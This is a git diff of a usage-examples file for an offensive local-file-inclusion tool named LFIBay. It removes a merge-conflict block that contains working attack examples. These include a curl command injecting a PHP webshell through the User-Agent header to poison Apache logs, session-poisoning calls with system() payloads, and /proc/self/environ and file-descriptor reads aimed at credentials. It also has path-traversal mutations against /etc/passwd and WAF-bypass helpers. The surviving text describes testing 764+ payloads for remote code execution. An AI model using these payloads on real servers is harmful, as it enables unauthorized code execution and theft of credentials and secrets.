@@ -1,20 +1,11 @@
-<<<<<<< Updated upstream
 # LFIBay 3.0 - Quick Usage Examples
 
 ## 🚀 Basic Usage (Unchanged)
-=======
-# Usage Examples
-
-Quick examples for using new v3.0 features.
-
-## Basic Usage
->>>>>>> Stashed changes
 
 ```bash
 python lfibay.py
 ```
 
-<<<<<<< Updated upstream
 1. Enter login URL → Manual login → Press Enter
 2. Enter upload form URL
 3. Tool automatically tests 764+ payloads
@@ -107,56 +98,10 @@ http://example.com/view.php?file=/var/log/apache2/access.log&cmd=id
 ### 3. Session Poisoning
 
 **Use Case**: Hijack PHP sessions for RCE
-=======
-Enter login URL, login manually in browser, enter upload URL. Tool handles the rest.
-
-## Filter Chains
-
-```python
-from core.filter_chain import get_preset_chains
-
-chains = get_preset_chains()
-print(list(chains.keys()))
-# ['whoami', 'id', 'pwd', 'ls', 'phpinfo', 'webshell', 'read_passwd', 'readfile_passwd']
-
-# Get webshell chain
-webshell = chains['webshell']['chain']
-# Use in LFI: ?file=<chain>&cmd=id
-```
-
-## Log Poisoning
-
-```python
-from core.log_poisoning import poison_apache_log, detect_log_paths
-
-# Poison Apache log
-result = poison_apache_log(
-    'http://target.com',
-    "<?php system($_GET['cmd']); ?>",
-    method='user_agent'
-)
-
-# Find accessible logs
-logs = detect_log_paths('http://target.com/view.php?file=INJECT')
-print(logs)  # ['/var/log/apache2/access.log', ...]
-
-# Include poisoned log
-# ?file=/var/log/apache2/access.log&cmd=id
-```
-
-Manual method:
-```bash
-curl "http://target.com" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
-# Then: ?file=/var/log/apache2/access.log&cmd=whoami
-```
-
-## Session Poisoning
->>>>>>> Stashed changes
 
 ```python
 from core.session_poisoning import extract_phpsessid, poison_session, generate_session_paths
 
-<<<<<<< Updated upstream
 # Extract session ID
 cookies = {'PHPSESSID': 'qmmlo8ptb8akof92oerk191o9b'}
 session_id = extract_phpsessid(cookies)
@@ -278,115 +223,3 @@ Mutations:
 ```
 
 Refer to README.md and CHANGELOG.md for complete documentation.
-=======
-cookies = {'PHPSESSID': 'abc123def456'}
-session_id = extract_phpsessid(cookies)
-
-# Poison session
-poison_session(
-    'http://target.com/profile.php',
-    cookies,
-    "<?php system('id'); ?>",
-    param_name='username'
-)
-
-# Get session file paths
-paths = generate_session_paths(session_id)
-print(paths[0])  # /var/lib/php/sessions/sess_abc123def456
-# Include: ?file=/var/lib/php/sessions/sess_abc123def456
-```
-
-## /proc/ Exploitation
-
-```python
-from core.proc_exploitation import brute_force_fd, extract_environ
-
-# Brute force file descriptors
-fds = brute_force_fd('http://target.com/view.php?file=INJECT', start=0, end=20)
-for fd in fds:
-    if fd['interesting']:
-        print(f"FD {fd['fd']}: {fd['preview'][:50]}")
-
-# Extract environment variables
-env = extract_environ('http://target.com/view.php?file=INJECT')
-if env['success']:
-    print(f"Found {len(env['env_vars'])} variables")
-    if env['sensitive_found']:
-        print("Sensitive data detected!")
-```
-
-Manual test:
-```
-?file=/proc/self/environ
-?file=/proc/self/fd/10
-?file=/proc/self/cmdline
-```
-
-## Payload Mutations
-
-```python
-from utils.payload_mutator import mutate_all, mutate_single
-
-payloads = ['../../../etc/passwd']
-mutated = mutate_all(payloads, max_mutations_per_payload=10)
-print(f"{len(mutated)} variations generated")
-
-# Single mutation
-single = mutate_single('../../../etc/passwd')
-for var in single[:5]:
-    print(var)
-# Output:
-# ..%2f..%2f..%2fetc%2fpasswd
-# ..%252f..%252f..%252fetc%252fpasswd
-# ....//....//....//etc/passwd
-# etc.
-```
-
-## Attack Chain Detection
-
-```python
-from core.chain_detector import perform_full_reconnaissance, get_next_action
-
-findings = perform_full_reconnaissance(
-    'http://target.com',
-    lfi_param='file',
-    cookies={'PHPSESSID': 'abc123'}
-)
-
-action = get_next_action(findings)
-print(action['message'])
-print(f"Chain: {action['chain']['name']}")
-print(f"Success rate: {action['chain']['success_probability']*100}%")
-```
-
-## WAF Bypass
-
-```python
-from core.waf_bypass_advanced import detect_waf, mutate_payload, generate_bypass_headers
-
-# Detect WAF
-waf = detect_waf(response)
-if waf['detected']:
-    print(f"WAF: {waf['type']}")
-    
-# Generate bypass payloads
-original = '../../../etc/passwd'
-mutations = mutate_payload(original)
-for m in mutations[:5]:
-    print(m)
-
-# Bypass headers
-headers = generate_bypass_headers()
-# Add to requests
-```
-
-## Tips
-
-- Start with chain detection to find best attack path
-- Log poisoning usually has highest success rate
-- Use mutations when getting blocked by WAF
-- Check /proc/ for credentials and API keys
-- Filter chains work without any file upload
-
-See README.md and CHANGELOG.md for more details.
->>>>>>> Stashed changes
